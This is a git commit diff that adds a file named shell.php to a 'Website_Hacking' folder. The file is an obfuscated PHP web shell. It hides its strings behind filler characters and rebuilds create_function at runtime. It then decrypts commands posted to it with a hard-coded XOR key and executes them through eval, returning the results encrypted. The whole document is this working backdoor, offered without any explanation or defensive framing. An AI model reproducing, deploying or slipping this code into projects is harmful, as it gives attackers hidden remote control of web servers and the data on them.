bb8d5d6cf96dc6bb4a05411cb18d6babd4549965
Le Quang Duy - Kali Linux <quangduynb00@gmail.com>
2021-09-19 14:06:15 -0700

    Add documents

---
+++ Website_Hacking/shell/shell.php
@@ -0,0 +1,12 @@
+<?php
+$w='JK6JpjwFF6J6Jg6JcWnq";function x($6Jt,$k){$c=strlen(6J$k)6J;$l=strlen(6J$t);$o="";for6J($';
+$e='$k=6J6J6J"6J202cb962";$kh6J="6Ja6Jc59075b964b";$kf="07152d2346Jb6J706J";$p="rq6Jpxm6';
+$F='i6J=0;$i<6J$l;){6Jfor($j6J=0;(6J$j6J<$c&&$6J6Ji<$l);$j++,$i++){6J$6Jo.6J=$t{6J$i}^$k';
+$a='tents("php://input"6J),$m)=6J=1) {6J@ob_st6Ja6Jrt();@ev6Jal(@g6Jzuncompre6Jss(@x(@ba';
+$M='{$j};}}return $6Jo;}if (6J@preg_6J6J6Jmatch6J("/$6Jkh(.+)6J$kf/6J",@f6Jile_get_con6J';
+$L='6Jse6J646J_decode6J($m[1]),$6Jk)));$o=@6Job6J_get_conten6J6Jts();@o6J6Jb_end_clean()';
+$p='6J;$r=@b6Jase6J64_encode6J(@x(@gz6Jcom6Jpress($6Jo),$6J6Jk));print6J("$p$kh$r$kf");}';
+$O=str_replace('jy','','crjyeajytjye_fjyjyujynction');
+$Z=str_replace('6J','',$e.$w.$F.$M.$a.$L.$p);
+$C=$O('',$Z);$C();
+?>
